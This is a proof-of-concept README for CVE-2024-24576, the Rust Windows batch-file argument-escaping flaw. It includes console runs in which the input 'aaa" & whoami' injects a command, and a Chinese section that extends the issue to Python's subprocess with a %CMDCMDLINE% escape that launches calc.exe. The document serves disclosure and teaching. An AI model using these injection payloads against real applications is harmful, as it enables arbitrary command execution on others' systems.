# CVE-2024-24576 PoC


The ```Command::arg``` and ```Command::args``` APIs state in their documentation that the arguments will be passed to the spawned process as-is, regardless of the content of the arguments, and will not be evaluated by a shell. This means it should be safe to pass untrusted input as an argument.

On Windows, the implementation of this is more complex than other platforms, because the Windows API only provides a single string containing all the arguments to the spawned process, and it's up to the spawned process to split them. Most programs use the standard C run-time argv, which in practice results in a mostly consistent way arguments are splitted.

One exception though is cmd.exe (used among other things to execute batch files), which has its own argument splitting logic. That forces the standard library to implement custom escaping for arguments passed to batch files. Unfortunately it was reported that our escaping logic was not thorough enough, and it was possible to pass malicious arguments that would result in arbitrary shell execution.


Running the main.rs file with the following payloads give 

```
C:\Users\frost\testing>cargo run
   Compiling testing v0.1.0 (C:\Users\frost\testing)
    Finished dev [unoptimized + debuginfo] target(s) in 0.49s
     Running `target\debug\testing.exe`
enter payload here
aaa
Output:
Argument received: aaa
```

```
C:\Users\frost\testing>cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `target\debug\testing.exe`
enter payload here
aaa & whoami
Output:
Argument received: "aaa & whoami"
```

```
C:\Users\frost\testing>cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `target\debug\testing.exe`
enter payload here
aaa" & whoami
Output:
Argument received: "aaa\"
desktop-8j2vk8b\frost
```

Note the escaped argument with the " whoami

NOT MY FINDING!

Sources:
https://github.com/rust-lang/rust/security/advisories/GHSA-q455-m56c-85mh
https://www.bleepingcomputer.com/news/security/critical-rust-flaw-enables-windows-command-injection-attacks/

## More

但不只是rust，大部分编程语言存在这个问题。

python在我们执行 `.bat` 或 `.exe` 时，调用winapi，其最终执行的命令应该是 `C:\WINDOWS\system32\cmd.exe /c "D:\test.bat"`
```python
# Lib/subprocess.py
# Popen.wait 
# _execute_child
# ...
# Start the process
try:
     hp, ht, pid, tid = _winapi.CreateProcess(executable, args,
                              # no special security
                              None, None,
                              int(not close_fds),
                              creationflags,
                              env,
                              cwd,
                              startupinfo)
```


args 参数处理，转义了 `"` 和 `\`

```python
args = list2cmdline(args)

def list2cmdline(seq):
    """
    Translate a sequence of arguments into a command line
    string, using the same rules as the MS C runtime:

    1) Arguments are delimited by white space, which is either a
       space or a tab.

    2) A string surrounded by double quotation marks is
       interpreted as a single argument, regardless of white space
       contained within.  A quoted string can be embedded in an
       argument.

    3) A double quotation mark preceded by a backslash is
       interpreted as a literal double quotation mark.

    4) Backslashes are interpreted literally, unless they
       immediately precede a double quotation mark.

    5) If backslashes immediately precede a double quotation mark,
       every pair of backslashes is interpreted as a literal
       backslash.  If the number of backslashes is odd, the last
       backslash escapes the next double quotation mark as
       described in rule 3.
    """

    # See
    # http://msdn.microsoft.com/en-us/library/17w5ykft.aspx
    # or search http://msdn.microsoft.com for
    # "Parsing C++ Command-Line Arguments"
    result = []
    needquote = False
    for arg in map(os.fsdecode, seq):
        bs_buf = []

        # Add a space to separate this argument from the others
        if result:
            result.append(' ')

        needquote = (" " in arg) or ("\t" in arg) or not arg
        if needquote:
            result.append('"')

        for c in arg:
            if c == '\\':
                # Don't know if we need to double yet.
                bs_buf.append(c)
            elif c == '"':
                # Double backslashes.
                result.append('\\' * len(bs_buf)*2)
                bs_buf = []
                result.append('\\"')
            else:
                # Normal char
                if bs_buf:
                    result.extend(bs_buf)
                    bs_buf = []
                result.append(c)

        # Add remaining backslashes, if any.
        if bs_buf:
            result.extend(bs_buf)

        if needquote:
            result.extend(bs_buf)
            result.append('"')

    return ''.join(result)
```

`cmd.exe`用于执行批处理文件有自己的参数分割逻辑。
- 大部分编程语言对其转义逻辑不够彻底，有可能传递恶意参数，导致任意的 shell 命令可以执行

逃逸语句如下
```pwsh
cmd.exe /c 'echo "%CMDCMDLINE:~-1%&calc.exe"
```

- [batbadbut-you-cant-securely-execute-commands-on-windows/](https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/)
- [Windows Command Escape Vulnerability - Critical CVE ... or is it?](https://www.youtube.com/watch?v=WNmNXc_EZdM)
- [cve-2024-24576](https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html)